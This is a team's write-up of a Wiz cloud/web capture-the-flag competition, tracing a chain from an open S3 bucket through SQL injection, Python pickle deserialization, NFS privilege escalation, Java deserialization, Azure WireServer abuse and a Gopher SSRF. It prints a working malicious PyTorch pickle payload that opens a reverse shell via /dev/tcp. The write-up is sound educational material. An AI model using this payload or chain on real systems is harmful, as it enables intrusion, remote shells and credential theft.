# Operation Cloudfall

When I heard that Wiz Research were organising an in-person CTF in London, at Black Hat Europe, with a 20k prize pool, I reached out to some CTF buddies from [cr0wn](https://ctftime.org/team/48976). They were also excited to play, we chose the team name "Operation Crownfall" (hrpr, hyperreality, mrtumble, nankeen, and ZetaTwo). Wiz are known for writing [cloud-based CTF challenges](https://www.wiz.io/ctf); we played their ["Ultimate Cloud Security Championship"](https://www.cloudsecuritychampionship.com/) to practice.

The competition was divided into two "tracks", Cloud/Web challenges, and Pwn/Rev challenges. There were 5k prizes for the winner of each track, and a 10k prize for the winner overall.

Ultimately we took first place in Cloud/Web and second place in Pwn/Rev behind the [Xint](https://xint.io/) team, taking home 15k in total. We also really enjoyed and learned from the challenges, and thank Wiz for hosting the event.

![](images/leaderboard.jpg)

The challenges are down now so this writeup for the Cloud/Web track is based on bits and pieces we saved during the event. The storyline was about an evil robot called EGOR which we had to shut down.

### 1. Free for All

We were given a static website. It contained a JavaScript file that we looked at in detail but it only made cosmetic changes to the page. SVG images were loaded from an s3 bucket. It turned out that inside the bucket was also a PDF containing the first flag and instructions for the next stage.

![](images/panel.jpg)

We took longer than we should have done on this first challenge, because there is an important distinction in the S3 api with the final forward slash. If you try the following it will get information about an object called `images`:

`aws s3 ls s3://bucket-name/images --no-sign-request`

We did not have permission to do this. However we did have permission to list files inside the `images/` directory:

`aws s3 ls s3://bucket-name/images/ --no-sign-request`

### 2. Employees Only

Now we had access to an admin panel website. The infrastructure setup was pretty nice as we got our own per-team instance at `https://$TEAM_ID.a1.supersecretadminpanel.getegi.ai/`.

We noticed that the webserver was misconfigured to send a HTTP response even when we were unauthorized and got redirected. From this we found a user search route, which was vulnerable to SQL injection. Popping that in `sqlmap` gave us admin creds to log in.

### 3. Speak to the Manager

Now we had admin access to the panel, there was a feature to upload Pytorch models.

![](images/e2e.jpg)

This was clearly a Python deserialization vulnerability but it took a few tries to get right, the following worked to give us a shell on the box:

```python
# malicious_payload.py
import torch, pickle, os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'sh -i >& /dev/tcp/IP/PORT 0>&1'",))  # Arbitrary command

malicious_data = {
    "v_head.summary.weight": MaliciousPayload(),
    "v_head.summary.bias": torch.randn(10)
}

with open("value_head.bin", "wb") as f:
    pickle.dump(malicious_data, f)
```

### 4. Don't Test Me

Now we had shell on an AWS EC2 instance as a low privileged user. We tried a lot of things and got stuck here for a while, as there was a Java service `inference-logs-collector.jar` running as root and it looked like we had to exploit it. The service took JSON files loaded in a directory and processed them, but we couldn't get source code for the jar as it was root read-only so we were exploiting it blind.

Eventually in netstat output we noticed there was an NFS volume. I was annoyed with myself because earlier I had noticed `libnfs` libraries were installed in `/var/log/apt/history.log` but hadn't asked myself why. 

NFS trusts the ownership values (UID/GID) that the client claims when making file operations, so even as a low-privileged user locally, we could create a root bash shell file. And then launch that as the low-privileged user to escalate to root.

### 5. Watch the World Burn

Now we were able to grab the `inference-logs-collector.jar` file and decompile it using jadx-gui. We found that it was monitoring a directory for files, which it then would calculate metadata for (checksum, path, name). This got serialized into bytes and encrypted with AES-GCM. The symmetric key was encrypted with RSA-OAEP using a public key embedded in the jar. Then, the result was sent to an Azure storage queue.

The important thing here was the method used to serialize the object:

```java
    private byte[] serializeToBytes(FileMetadata metadata) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
```

If a similar deserialization routine was happening on the other end of the queue, this could be vulnerable to classic Java deserialization exploitable with `ysoserial`.

However, getting this attack working proved to be the most difficult part of the competition. We thought we might be missing something. Until finally we had success with a modified and recompiled version of `inference-logs-collector.jar` itself, with the `CommonsCollection7` payload.

Getting a shell from this also proved surprisingly difficult in our tired state, due to some restriction we didn't get to the bottom of. In the end it worked to write a shell script containing a Python reverse shell, using curl.

### 6. Over The Wire

We now had a low-privileged shell on a container in an Azure cloud environment. We decompiled the `queue-consumer-server.jar` listening here but there was nothing new we didn't expect. We tried all normal enumeration and scanned the network, and found an unusual host `wireserver.ctf_ctf_net` with no open ports.

Next we found that the standard cloud metadata IP 169.254.169.254 was down, however a special IP address using internally in Azure, 168.63.129.16, was up. Some resources online call that the Wireserver which tied in with the name of the challenge. Although we found that earlier this year [Azure have disabled that endpoint](https://azurelook.com/azure-update/azure-imds-instance-metadata-service-calls-to-168-63-129-16-blocked-after-july-1st-2025/), which was perhaps why `wireserver.ctf_ctf_net` existed, to emulate the behavior.

Two blog posts were essential at showing us what to do next:
 * https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability-walkthrough
 * https://cybercx.com.au/blog/azure-ssrf-metadata/

The metadata endpoint exposes encrypted/protected settings, and by using our own certificate we could obtain the key from WireServer to decrypt the protected settings. We got stuck here for a while due to a forward slash. Both blogs above refer to http://168.63.129.16/machine/?comp=goalstate but we had to use http://168.63.129.16/machine?comp=goalstate

The decrypted protected settings contained an AWS IAM keypair.

### 7. Go for It

The AWS keypair allowed us to list images in an associated ECR registry. There were two images, `egi-egor/mgmt-container-staging` and `egi-egor/debug-bastion-yafbjmk4`. We didn't have permissions to pull the latter, but we could pull the first and inspected it using `dive`:

```bash
$ alias dive="docker run -ti --rm  -v /var/run/docker.sock:/var/run/docker.sock docker.io/wagoodman/dive"
$ dive mgmt-container-staging:latest
```

The image used an old version of `curl` (7.7.0) and ran a Flask webapp. We extracted the `app.py` script, which had some juicy credentials at the top:

```python
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-secret-key-change-in-production')

ADMIN_USERNAME = 'egiadmin'
ADMIN_PASSWORD = 'egi2025changeme'

# Database connection
DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://egi:egi_secret@localhost:5432/egi_diagnostics')
```

This Flask server would run on port 5000, and contained management functionality to terminate EGOR's infrastructure. Triggering it would allow us to win. The only problem is we didn't know where to find this container in the infrastructure. We were scanning all networks we had seen so far. Towards the end of the competition one of the challenge authors found us in the conference hall and told us there had been a mistake with the IAM policy and the `debug-bastion` image had been misnamed.

Once we had the correct name, we found we were able to push to the `debug-bastion` tag and deploy a reverse shell container into the target environment. Scanning the /18 we were in for port 5000, we found the vulnerable app.

The final exploit stage was pretty cool - we used a curl SSRF with a Gopher payload generated by [Gopherfy](https://github.com/hupe1980/gopherfy) to connect to Postgres and write to the database. Curl had been kept at version 7.7.0, due to the need to write nullbytes in the Gopher payload, which apparently was disabled from [version 7.7.1 onwards](https://github.com/curl/curl/issues/14219).

This gave us a code to shut down EGOR, which was performed in person at Wiz's CTF area.

![](images/destruct.jpg)

### Learnings

 * Wiz know how to make great realistic and original CTF challenges - check out their [CTF Hub](https://www.wiz.io/ctf)
 * Try with and without a forward slash as webservers handle this in different ways
 * The Xint and Skybound teams gave us a run for our money and really focussed us to work hard
 * We need better tooling for giving access or shells quickly to the whole team. Cloudflared tunnel seemed really good for this

